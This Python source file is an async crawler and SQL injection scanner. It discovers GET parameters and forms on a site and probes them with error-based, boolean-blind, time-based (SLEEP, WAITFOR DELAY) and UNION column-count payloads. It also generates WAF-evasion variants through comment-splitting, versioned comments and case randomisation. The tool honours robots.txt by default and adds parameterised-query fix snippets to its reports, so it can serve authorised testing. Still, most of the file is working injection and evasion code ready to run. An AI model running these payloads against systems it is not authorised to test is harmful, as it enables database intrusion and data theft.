#!/usr/bin/env python3
"""
async_sqli_scanner.py
Async crawler + generic SQLi scanner (SQLite/PDO-friendly, MySQL-compatible).

Features:
- Async crawl of same-domain pages with depth control
- Discover GET parameters (and auto-enqueue forms for coverage)
- Test error-based and boolean-based SQLi (string and numeric contexts)
- Simple WAF-evasion (inline comments, case toggling)
- Concurrency with asyncio semaphores
- JSON, CSV, and latest_scan.json output

Usage:
    python app.py --start-url http://localhost:8000 --max-depth 2 --concurrency 10
"""

import asyncio, aiohttp, argparse, json, csv, random, re, time, glob, os, difflib
from urllib.parse import urlparse, urljoin, parse_qs
from urllib import robotparser

# -------------------------
# Config
# -------------------------
DEFAULT_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15"
]

PAYLOADS = {
    # Basic break-out / syntax error triggers
    "error": ["'", '"', "')", '" )'],
    # Boolean for numeric context
    "boolean_num_true": [" AND 1=1 -- "],
    "boolean_num_false": [" AND 1=2 -- "],
    # Boolean for string context (close quote first)
    "boolean_str_true": ["' OR '1'='1' -- "],
    "boolean_str_false": ["' OR '1'='2' -- "],
    # Union (best-effort, may not match columns)
    "union": [" UNION SELECT 1 -- ", " UNION SELECT 1,2 -- ", " UNION SELECT 1,2,3 -- "]
}

SQL_ERRORS = [
    # SQLite/PDO style
    re.compile(r"SQLSTATE\[[A-Z0-9]+\]", re.I),
    re.compile(r"near \".*\": syntax error", re.I),
    re.compile(r"no such column", re.I),
    re.compile(r"unrecognized token", re.I),
    re.compile(r"unterminated (?:quoted )?string", re.I),
    re.compile(r"SELECTs to the left and right of UNION do not have the same number of result columns", re.I),
    # MySQL style (keep for compatibility)
    re.compile(r"You have an error in your SQL syntax", re.I),
    re.compile(r"mysql_", re.I),
    re.compile(r"used SELECT statements have a different number of columns", re.I),
]

## DBMS fingerprinting removed per user request

# -------------------------
# Payload mutation
# -------------------------
def mutate_payload(payload: str):
    """
    Generate common WAF-evasion variants for a base payload.
    Techniques:
    - Keyword splitting with inline comments (e.g., UN/**/ION, SEL/**/ECT, A/**/ND)
    - Versioned comments (/*! ... */) around keywords
    - Whitespace tampering (tabs/newlines) and comment-as-space (/**/)
    - Trailing comment variants for line comments
    - Case randomization

    Returns a de-duplicated list preserving insertion order.
    """
    if not isinstance(payload, str):
        return [str(payload)]

    keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]

    def split_kw(s: str, kw: str) -> str:
        # Insert an inline comment roughly in the middle of the keyword occurrence
        def _repl(m):
            k = m.group(0)
            mid = max(1, len(k)//2)
            return f"{k[:mid]}/**/{k[mid:]}"
        return re.sub(rf"(?i)\b{kw}\b", _repl, s)

    def versioned_kw(s: str, kw: str) -> str:
        # Wrap keyword with MySQL-style versioned comment; benign on others
        def _repl(m):
            k = m.group(0)
            return f"/*!{k}*/"
        return re.sub(rf"(?i)\b{kw}\b", _repl, s)

    def case_alt(s: str) -> str:
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    def case_rand(s: str) -> str:
        rnd = random.Random(42)  # deterministic per process for stability
        out = []
        for ch in s:
            if ch.isalpha():
                out.append(ch.upper() if rnd.random() < 0.5 else ch.lower())
            else:
                out.append(ch)
        return ''.join(out)

    def whitespace_variant(s: str, repl: str) -> str:
        # Replace single spaces with a variant token
        return s.replace(" ", repl)

    muts: list[str] = []
    seen = set()

    def add(x: str):
        if not x:
            return
        if x not in seen:
            seen.add(x)
            muts.append(x)

    # 1) Original
    add(payload)

    # 2) Keyword splitting with inline comments
    tmp = payload
    for kw in keywords:
        tmp = split_kw(tmp, kw)
    add(tmp)

    # 3) Individual keyword splitting variants (lighter than full cross-product)
    for kw in keywords:
        add(split_kw(payload, kw))

    # 4) Versioned comments on keywords
    tmp_v = payload
    for kw in keywords:
        tmp_v = versioned_kw(tmp_v, kw)
    add(tmp_v)
    for kw in keywords:
        add(versioned_kw(payload, kw))

    # 5) Comment-as-space and whitespace tampering
    add(whitespace_variant(payload, "/**/"))
    add(whitespace_variant(payload, "\t"))
    add(whitespace_variant(payload, "\n"))

    # 6) Trailing comment variants if line comment present
    if "--" in payload:
        add(payload.replace("--", "-- "))
        add(payload.replace("--", "--+"))
        add(re.sub(r"--\s*", "-- - ", payload))

    # 7) Keyword followed by block-comment to break signatures (UNION/*x*/ SELECT)
    def kw_trail_comment(s: str) -> str:
        out = s
        for kw in keywords:
            out = re.sub(rf"(?i)\b{kw}\b", lambda m: m.group(0) + "/*x*/", out)
        return out
    add(kw_trail_comment(payload))

    # 8) Case alternation and randomized casing
    add(case_alt(payload))
    add(case_rand(payload))

    # 9) Existing specific UNION split kept for backward compatibility
    add(payload.replace("UNION", "UN/**/ION").replace("union", "un/**/ion"))

    return muts

# -------------------------
# Scanner class
# -------------------------
class AsyncSQLiScanner:
    def __init__(self, start_url, max_depth=2, concurrency=5, delay=0.3, timeout=10, user_agents=None,
                 max_retries=2, backoff_base=0.4, respect_robots=True, verbose=True, quiet=False,
                 boolean_rounds=3, union_max_columns=6, noise_grouping=True,
                 time_based=False, time_threshold=2.0, param_fuzz=False, robots_user_agent=None,
                 js_render: bool = False):
        # Crawl config
        self.start_url = start_url.rstrip('/')
        self.domain = urlparse(start_url).netloc
        self.scheme = urlparse(start_url).scheme
        self.max_depth = max_depth
        self.visited = set()
        self.to_visit = [(start_url, 0)]
        self.semaphore = asyncio.Semaphore(concurrency)
        self.delay = delay
        self.timeout = timeout
        self.user_agents = user_agents or DEFAULT_UA
        # Use a consistent UA for the whole session (improves robots.txt compliance)
        try:
            self.session_user_agent = (robots_user_agent or (self.user_agents[0] if self.user_agents else "AsyncSQLiScanner/1.0")).strip()
        except Exception:
            self.session_user_agent = "AsyncSQLiScanner/1.0"
        # State
        self.results = []
        self.form_targets = []  # accumulate discovered forms with params
        self._seen_findings = set()  # for de-duplication
        # Networking / policies
        self.max_retries = max_retries
        self.backoff_base = backoff_base
        self.respect_robots = respect_robots
        self._robots = None  # robotparser.RobotFileParser or None
        # Logging
        self.verbose = verbose and not quiet
        self.quiet = quiet
        # Detection tuning
        self.boolean_rounds = max(1, int(boolean_rounds))
        self.union_max_columns = int(union_max_columns)
        self.noise_grouping = bool(noise_grouping)
        self.time_based = bool(time_based)
        self.time_threshold = float(time_threshold)
        self.param_fuzz = bool(param_fuzz)
        # JS rendering (Playwright)
        self.js_render = bool(js_render)
        self._pw = None  # async_playwright instance
        self._pw_browser = None
        self._pw_context = None
        # Hooks for incremental events
        self.on_finding = None
        self.on_progress = None

    def _log(self, msg):
        if self.verbose and not self.quiet:
            print(msg)

    async def fetch(self, session, url, method="GET", data=None):
        headers = {"User-Agent": self.session_user_agent}
        attempt = 0
        while True:
            try:
                async with self.semaphore:
                    if method.upper() == "GET":
                        async with session.get(url, headers=headers, params=(data or None), timeout=self.timeout) as resp:
                            text = await resp.text()
                            # retry on 429 or 5xx
                            if resp.status in (429,) or 500 <= resp.status < 600:
                                raise aiohttp.ClientResponseError(request_info=resp.request_info, history=resp.history, status=resp.status, message="retryable status")
                            return resp.status, text
                    else:
                        async with session.post(url, headers=headers, data=data, timeout=self.timeout) as resp:
                            text = await resp.text()
                            if resp.status in (429,) or 500 <= resp.status < 600:
                                raise aiohttp.ClientResponseError(request_info=resp.request_info, history=resp.history, status=resp.status, message="retryable status")
                            return resp.status, text
            except Exception:
                if attempt >= self.max_retries:
                    return None, ""
                # exponential backoff with jitter
                sleep_for = self.backoff_base * (2 ** attempt) + random.uniform(0, 0.2)
                await asyncio.sleep(sleep_for)
                attempt += 1

    async def crawl(self):
        async with aiohttp.ClientSession() as session:
            # load robots.txt once if enabled
            if self.respect_robots:
                await self._load_robots(session)
            while self.to_visit:
                url, depth = self.to_visit.pop(0)
                if url in self.visited or depth > self.max_depth:
                    continue
                if self.respect_robots and not self._can_fetch(url):
                    self._log(f"[robots] Disallowed: {url}")
                    continue
                self.visited.add(url)
                # progress callback
                try:
                    if callable(self.on_progress):
                        self.on_progress({
                            'crawled': len(self.visited),
                            'queue': len(self.to_visit),
                            'findings': len(self.results)
                        })
                except Exception:
                    pass
                # Fetch HTML; optionally render with JS if enabled
                if self.js_render:
                    try:
                        text = await self._render_js(url)
                    except Exception:
                        # Fallback to HTTP fetch on failure
                        _, text = await self.fetch(session, url)
                else:
                    _, text = await self.fetch(session, url)
                await asyncio.sleep(self.delay)
                if text:
                    await self.extract_links_forms(session, text, url, depth)
                # update queue after extraction
                try:
                    if callable(self.on_progress):
                        self.on_progress({
                            'crawled': len(self.visited),
                            'queue': len(self.to_visit),
                            'findings': len(self.results)
                        })
                except Exception:
                    pass

    async def _load_robots(self, session):
        try:
            rp = robotparser.RobotFileParser()
            robots_url = f"{self.scheme}://{self.domain}/robots.txt"
            _, txt = await self.fetch(session, robots_url, method="GET")
            if txt:
                rp.parse(txt.splitlines())
                self._robots = rp
                self._log(f"[robots] Loaded robots.txt from {robots_url}")
        except Exception:
            self._robots = None

    def _can_fetch(self, url):
        if not self._robots:
            return True
        try:
            # Use the same UA we actually send in requests
            return self._robots.can_fetch(self.session_user_agent, url)
        except Exception:
            return True

    async def extract_links_forms(self, session, html, base_url, depth):
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, "html.parser")
        # A tags
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            absolute = urljoin(base_url, href)
            parsed = urlparse(absolute)
            if parsed.netloc == self.domain:
                normalized = parsed._replace(fragment='').geturl()
                if normalized not in self.visited and (not self.respect_robots or self._can_fetch(normalized)):
                    self.to_visit.append((normalized, depth+1))

        # Parse inline JS for endpoints (e.g., var url="..." or fetch/ajax calls)
        import re
        js_urls = set()
        for script in soup.find_all('script'):
            js = script.string or ''
            # Find var url="..." or fetch/ajax endpoints
            for m in re.finditer(r'(https?://[\w\-\.:/]+|/[^"\'\s]+\.(?:php|asp|jsp|json))', js):
                u = m.group(0)
                absu = urljoin(base_url, u)
                parsed = urlparse(absu)
                if parsed.netloc == self.domain and absu not in self.visited:
                    js_urls.add(absu)
        for u in js_urls:
            if (not self.respect_robots or self._can_fetch(u)):
                self.to_visit.append((u, depth+1))

        # Crawl API endpoints (.json, .php, .asp, .jsp) in page text
        for m in re.finditer(r'(https?://[\w\-\.:/]+|/[^"\'\s]+\.(?:php|asp|jsp|json))', html):
            u = m.group(0)
            absu = urljoin(base_url, u)
            parsed = urlparse(absu)
            if parsed.netloc == self.domain and absu not in self.visited:
                if (not self.respect_robots or self._can_fetch(absu)):
                    self.to_visit.append((absu, depth+1))

        # forms
        for form in soup.find_all('form'):
            action = form.get('action') or base_url
            method = (form.get('method') or "get").upper()
            absolute = urljoin(base_url, action)
            inputs = {}
            for inp in form.find_all(['input','textarea','select','button']):
                name = inp.get('name')
                typ = inp.get('type','text')
                val = inp.get('value')
                if name:
                    # Auto-generate dummy values for common fields
                    if typ == 'email' or 'email' in name.lower():
                        val = val or 'test@example.com'
                    elif typ == 'tel' or 'phone' in name.lower():
                        val = val or '1234567890'
                    elif 'user' in name.lower() or 'login' in name.lower():
                        val = val or 'testuser'
                    elif 'pass' in name.lower():
                        val = val or 'Password123!'
                    elif typ == 'hidden':
                        val = val or 'hiddenval'
                    else:
                        val = val or 'test'
                    inputs[name] = val
            # store as target for scanning
            if (not self.respect_robots) or self._can_fetch(absolute):
                self.form_targets.append({"type": method, "url": absolute, "params": inputs})
            if absolute not in self.visited and (not self.respect_robots or self._can_fetch(absolute)):
                self.to_visit.append((absolute, depth+1))

    async def discover_targets(self):
        targets = []
        for url in self.visited:
            parsed = urlparse(url)
            qs = parsed.query
            if qs:
                params = {k:v[0] if isinstance(v,list) else v for k,v in parse_qs(qs).items()}
                clean_url = parsed._replace(query='').geturl()
                targets.append({"type":"GET","url":clean_url,"params":params})
        # include discovered HTML form targets
        # avoid duplicates by a simple set of tuples
        seen = set()
        out = []
        for t in targets + self.form_targets:
            key = (t['type'], t['url'], tuple(sorted(t['params'].items())))
            if key not in seen:
                seen.add(key)
                out.append(t)
        return out

    async def test_target(self, session, target):
        base_type = target['type']
        base_url = target['url']
        params = target['params'].copy()
        status, baseline_text = await self.fetch(session, base_url, method=base_type, data=params)
        baseline_len = len(baseline_text)

        def _risk_for(tech: str):
            tl = tech.lower()
            if 'union-confirmed' in tl:
                return 'Critical'
            if 'error' in tl:
                return 'High'
            if 'boolean' in tl:
                return 'Medium'
            return 'Medium'

        def _fix_snippet(param):
            # Simple PDO-style snippet
            return (
                f"// PHP PDO example\n"
                f"$stmt = $pdo->prepare('SELECT * FROM table WHERE {param} = ?');\n"
                f"$stmt->execute([$value]);\n"
                f"$row = $stmt->fetch();\n"
            )

        def _score_for(tech: str, evidence: str) -> float:
            t = (tech or '').lower()
            base = 7.0
            if 'union-confirmed' in t:
                base = 9.8
            elif 'error' in t:
                base = 8.6
            elif 'boolean' in t:
                base = 7.5
            elif 'time' in t:
                base = 7.0
            ev = evidence or ''
            try:
                m = re.search(r"columns=(\d+)", ev)
                if m:
                    cols = int(m.group(1))
                    base += min(0.5, cols * 0.05)
            except Exception:
                pass
            try:
                m = re.search(r"diffs=(\d+)", ev)
                if m:
                    diffs = int(m.group(1))
                    base += min(0.3, diffs * 0.05)
            except Exception:
                pass
            try:
                m = re.search(r"prox=(\d+)", ev)
                if m:
                    prox = int(m.group(1))
                    if prox < 200:
                        base += 0.2
            except Exception:
                pass
            return max(0.0, min(10.0, round(base, 1)))

        def record(tech, param, payload, evidence="", extra=None):
            key = (base_url, base_type, param, tech) if self.noise_grouping else (base_url, base_type, param, tech, payload)
            if key in self._seen_findings:
                return
            self._seen_findings.add(key)
            entry = {"url": base_url, "type": base_type, "param": param, "technique": tech, "payload": payload, "evidence": evidence}
            entry["risk"] = _risk_for(tech)
            entry["score"] = _score_for(tech, evidence)
            entry["fix_snippet"] = _fix_snippet(param)
            if isinstance(extra, dict):
                entry.update(extra)
            self.results.append(entry)
            # incremental callback if provided
            try:
                if callable(self.on_finding):
                    self.on_finding(entry)
            except Exception:
                pass
            if not self.quiet:
                print(f"[!] VULN {tech}: {base_url} param={param} payload={payload}")

        def differ(a, b, len_threshold=0.02, ratio_threshold=0.90):
            # consider different if either size delta is significant or similarity ratio is low
            if not a or not b:
                return False
            if abs(len(a) - len(b)) > max(50, len_threshold * max(len(a), len(b))):
                return True
            try:
                ratio = difflib.SequenceMatcher(None, a, b).quick_ratio()
                return ratio < ratio_threshold
            except Exception:
                return False

        def _seed_values(orig_val):
            if not self.param_fuzz:
                return [orig_val]
            seeds = [orig_val, "", "0", "1", "-1", "admin", "A"*32, "'\"<>&", "null"]
            # de-dup while preserving order
            seen = set()
            out = []
            for s in seeds:
                if s not in seen:
                    out.append(s)
                    seen.add(s)
            return out

        # Error-based (with proximity + HTTP status context)
        for p in list(params.keys()):
            original = params[p]
            for base_seed in _seed_values(original):
                params[p] = base_seed
                for pay in PAYLOADS['error']:
                    for mp in mutate_payload(pay):
                        inj_val = base_seed + mp
                        params[p] = inj_val
                        st, txt = await self.fetch(session, base_url, method=base_type, data=params)
                        for pat in SQL_ERRORS:
                            m = pat.search(txt or '')
                            if m:
                                # proximity: distance between payload snippet and error location
                                err_idx = m.start()
                                snippet = (mp or '')[:10]
                                pv_idx = (txt or '').find(snippet)
                                prox = (abs(err_idx - pv_idx) if pv_idx != -1 else None)
                                evidence = f"{pat.pattern} | status={st} | prox={prox if prox is not None else 'n/a'}"
                                record("error-based", p, mp, evidence)
                params[p] = original

        # Boolean-based (blind) — multi-round tests with diff ratio
        for p in list(params.keys()):
            orig = params[p]
            for base_seed in _seed_values(orig):
                params[p] = base_seed
                # numeric
                t_payload = mutate_payload(PAYLOADS['boolean_num_true'][0])[0]
                f_payload = mutate_payload(PAYLOADS['boolean_num_false'][0])[0]
                sims = []
                diffs = 0
                for _ in range(self.boolean_rounds):
                    params[p] = base_seed + t_payload
                    _, t_resp = await self.fetch(session, base_url, method=base_type, data=params)
                    params[p] = base_seed + f_payload
                    _, f_resp = await self.fetch(session, base_url, method=base_type, data=params)
                    if differ(t_resp, f_resp):
                        diffs += 1
                    try:
                        sims.append(difflib.SequenceMatcher(None, t_resp or '', f_resp or '').quick_ratio())
                    except Exception:
                        pass
                if diffs >= max(2, (self.boolean_rounds+1)//2):
                    sim_avg = sum(sims)/len(sims) if sims else 0.0
                    record("boolean-blind", p, f"{t_payload}/{f_payload}", evidence=f"rounds={self.boolean_rounds} diffs={diffs} sim_avg={sim_avg:.3f}")

                # string
                st_payload = mutate_payload(PAYLOADS['boolean_str_true'][0])[0]
                sf_payload = mutate_payload(PAYLOADS['boolean_str_false'][0])[0]
                sims = []
                diffs = 0
                for _ in range(self.boolean_rounds):
                    params[p] = base_seed + st_payload
                    _, st_resp = await self.fetch(session, base_url, method=base_type, data=params)
                    params[p] = base_seed + sf_payload
                    _, sf_resp = await self.fetch(session, base_url, method=base_type, data=params)
                    if differ(st_resp, sf_resp):
                        diffs += 1
                    try:
                        sims.append(difflib.SequenceMatcher(None, st_resp or '', sf_resp or '').quick_ratio())
                    except Exception:
                        pass
                if diffs >= max(2, (self.boolean_rounds+1)//2):
                    sim_avg = sum(sims)/len(sims) if sims else 0.0
                    record("boolean-blind", p, f"{st_payload}/{sf_payload}", evidence=f"rounds={self.boolean_rounds} diffs={diffs} sim_avg={sim_avg:.3f}")
            params[p] = orig

        # Time-based (opt-in). Uses backend-specific functions; threshold in seconds.
        if self.time_based:
            # Short list of payloads for MySQL and MSSQL
            def time_payloads(seconds: float):
                s_int = max(1, int(seconds))
                return [
                    # MySQL
                    f" AND SLEEP({s_int}) -- ",
                    f"' OR SLEEP({s_int}) -- ",
                ]
            # MSSQL WAITFOR (string context)
            mssql = [f"'; WAITFOR DELAY '0:0:{max(1,int(self.time_threshold))}';-- "]
            for p in list(params.keys()):
                orig = params[p]
                base_seed = orig  # keep it simple to limit runtime
                # baseline timing
                params[p] = base_seed
                t0 = time.monotonic()
                await self.fetch(session, base_url, method=base_type, data=params)
                t_base = time.monotonic() - t0
                # test payloads
                for pay in time_payloads(self.time_threshold) + mssql:
                    if not pay:
                        continue
                    params[p] = base_seed + pay
                    t1 = time.monotonic()
                    await self.fetch(session, base_url, method=base_type, data=params)
                    dt = time.monotonic() - t1
                    if dt - t_base >= (self.time_threshold * 0.8):  # tolerate jitter
                        record("time-based", p, pay.strip(), evidence=f"delta={dt:.2f}s base={t_base:.2f}s thr={self.time_threshold:.2f}s")
                params[p] = orig

        # UNION-based: attempt column count detection and confirmation
        for p in list(params.keys()):
            orig = params[p]
            col_count = None
            # Try 1..union_max_columns for string and numeric contexts
            for n in range(1, self.union_max_columns+1):
                cols = ','.join(['NULL']*n)
                # numeric context
                up = f" UNION SELECT {cols} -- "
                params[p] = orig + up
                _, txt_n = await self.fetch(session, base_url, method=base_type, data=params)
                # string context (close quote first)
                sp = f"' UNION SELECT {cols} -- "
                params[p] = orig + sp
                _, txt_s = await self.fetch(session, base_url, method=base_type, data=params)
                params[p] = orig
                def has_col_mismatch(s):
                    return bool(re.search(r"(number of result columns|different number of columns)", s or '', re.I))
                n_err = any(pat.search(txt_n or '') for pat in SQL_ERRORS)
                s_err = any(pat.search(txt_s or '') for pat in SQL_ERRORS)
                if (txt_n and not has_col_mismatch(txt_n)) or (txt_s and not has_col_mismatch(txt_s)):
                    # If general SQL error vanished (esp. mismatch), we tentatively accept n
                    if not has_col_mismatch(txt_n or '') and not has_col_mismatch(txt_s or ''):
                        col_count = n
                        break
            if col_count:
                # Confirm union by injecting a distinctive value in one column
                cols = ["NULL"]*col_count
                mark = "ZXUNIONZX"
                mid = col_count//2
                cols[mid] = f"'{mark}'"
                union_payload = f" UNION SELECT {','.join(cols)} -- "
                params[p] = orig + union_payload
                _, union_text = await self.fetch(session, base_url, method=base_type, data=params)
                params[p] = orig
                if union_text and (mark in union_text or differ(union_text, baseline_text)):
                            record("union-confirmed", p, union_payload.strip(), evidence=f"columns={col_count}", extra={"columns": col_count})

        # Time-based tests are skipped for SQLite (no built-in SLEEP); could be added with heavy functions but omitted by default.

    async def run(self):
        # Initialize Playwright if JS rendering is enabled
        if self.js_render:
            await self._ensure_playwright()
        try:
            async with aiohttp.ClientSession() as session:
                await self.crawl()
                targets = await self.discover_targets()
                if not self.quiet:
                    print(f"[+] {len(targets)} targets discovered")
                tasks = [self.test_target(session, t) for t in targets]
                await asyncio.gather(*tasks)
        finally:
            if self.js_render:
                await self._close_playwright()

    async def _ensure_playwright(self):
        if self._pw:
            return
        try:
            from playwright.async_api import async_playwright
        except Exception as e:
            self._log(f"[js] Playwright not available: {e}")
            self.js_render = False
            return
        self._pw = await async_playwright().start()
        # Use Chromium headless
        self._pw_browser = await self._pw.chromium.launch(headless=True)
        self._pw_context = await self._pw_browser.new_context(user_agent=self.session_user_agent)

    async def _close_playwright(self):
        try:
            if self._pw_context:
                await self._pw_context.close()
        except Exception:
            pass
        try:
            if self._pw_browser:
                await self._pw_browser.close()
        except Exception:
            pass
        try:
            if self._pw:
                await self._pw.stop()
        except Exception:
            pass
        self._pw = None
        self._pw_browser = None
        self._pw_context = None

    async def _render_js(self, url: str) -> str | None:
        if not self._pw_context:
            return None
        page = await self._pw_context.new_page()
        try:
            await page.goto(url, wait_until='networkidle', timeout=int(self.timeout * 1000))
            html = await page.content()
            return html
        except Exception:
            return None
        finally:
            try:
                await page.close()
            except Exception:
                pass

    def export_results(self, prefix="scan"):
        ts = int(time.time())
        json_path = f"{prefix}_{ts}.json"
        csv_path = f"{prefix}_{ts}.csv"
        pdf_path = f"{prefix}_{ts}.pdf"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2)

        keys = ["url", "type", "param", "technique", "risk", "score", "payload", "evidence", "fix_snippet"]
        with open(csv_path, "w", newline='', encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            for row in self.results:
                writer.writerow({k: row.get(k, "") for k in keys})

        # Try PDF export (optional)
        pdf_ok = False
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
            from reportlab.lib.styles import getSampleStyleSheet
            from reportlab.lib import colors

            doc = SimpleDocTemplate(pdf_path, pagesize=letter)
            styles = getSampleStyleSheet()
            elems = []
            elems.append(Paragraph("SQLi Scan Report", styles['Title']))
            elems.append(Paragraph(time.strftime("Generated: %Y-%m-%d %H:%M:%S", time.localtime(ts)), styles['Normal']))
            elems.append(Spacer(1, 12))
            # Summary
            elems.append(Paragraph(f"Findings: {len(self.results)}", styles['Heading3']))
            # Table (compact)
            table_head = ["Technique", "Risk", "Score", "URL", "Param", "Evidence"]
            data = [table_head]
            for r in self.results:
                data.append([
                    r.get("technique", ""),
                    r.get("risk", ""),
                    r.get("score", ""),
                    r.get("url", ""),
                    r.get("param", ""),
                    (r.get("evidence", "") or "")[:120],
                ])
            tbl = Table(data, repeatRows=1)
            tbl.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#203063')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 8),
                ('GRID', (0, 0), (-1, -1), 0.25, colors.grey),
            ]))
            elems.append(tbl)
            elems.append(Spacer(1, 12))
            elems.append(Paragraph("Sample secure query snippet (example):", styles['Heading4']))
            if self.results:
                s = self.results[0].get("fix_snippet", "Use parameterized queries.")
                elems.append(Paragraph(f"<pre>{s}</pre>", styles['Code']))
            doc.build(elems)
            pdf_ok = True
        except Exception:
            pdf_ok = False

        # Also write/refresh a stable filename for dashboards
        try:
            with open("latest_scan.json", "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=2)
        except Exception:
            pass
        if pdf_ok:
            print(f"[+] Exported {json_path}, {csv_path}, {pdf_path}, and latest_scan.json")
        else:
            print(f"[+] Exported {json_path}, {csv_path}, and latest_scan.json (PDF skipped)")

# -------------------------
# CLI
# -------------------------
def parse_args():
    ap = argparse.ArgumentParser(description="Async crawler + SQLi scanner")
    ap.add_argument("--start-url", "-u", required=True)
    ap.add_argument("--max-depth", type=int, default=2)
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--delay", type=float, default=0.3)
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--backoff", type=float, default=0.4)
    ap.add_argument("--no-robots", action="store_true", help="Ignore robots.txt")
    ap.add_argument("--boolean-rounds", type=int, default=3)
    ap.add_argument("--union-max-columns", type=int, default=6)
    ap.add_argument("--no-noise-grouping", action="store_true", help="Do not group duplicate payload hits for same URL/param/technique")
    # New options
    ap.add_argument("--time-based", action="store_true", help="Enable time-based SQLi tests (use with MySQL/MSSQL targets)")
    ap.add_argument("--time-threshold", type=float, default=2.0, help="Threshold in seconds to flag time-based differences")
    ap.add_argument("--param-fuzz", action="store_true", help="Mutate discovered form field values with seed variants before injection")
    ap.add_argument("--crawler-ua", type=str, default=None, help="User-Agent string to use for both requests and robots.txt checks")
    ap.add_argument("--js-render", action="store_true", help="Enable Playwright-based JS rendering during crawl")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--quiet", action="store_true")
    g.add_argument("--verbose", action="store_true")
    return ap.parse_args()

if __name__=="__main__":
    args = parse_args()
    scanner = AsyncSQLiScanner(
        start_url=args.start_url,
        max_depth=args.max_depth,
        concurrency=args.concurrency,
        delay=args.delay,
        timeout=args.timeout,
        max_retries=args.retries,
        backoff_base=args.backoff,
        respect_robots=(not args.no_robots),
        verbose=args.verbose and not args.quiet,
        quiet=args.quiet,
    boolean_rounds=args.boolean_rounds,
    union_max_columns=args.union_max_columns,
    noise_grouping=(not args.no_noise_grouping),
    time_based=args.time_based,
    time_threshold=args.time_threshold,
    param_fuzz=args.param_fuzz,
    robots_user_agent=args.crawler_ua,
    js_render=args.js_render,
    )
    asyncio.run(scanner.run())
    scanner.export_results()
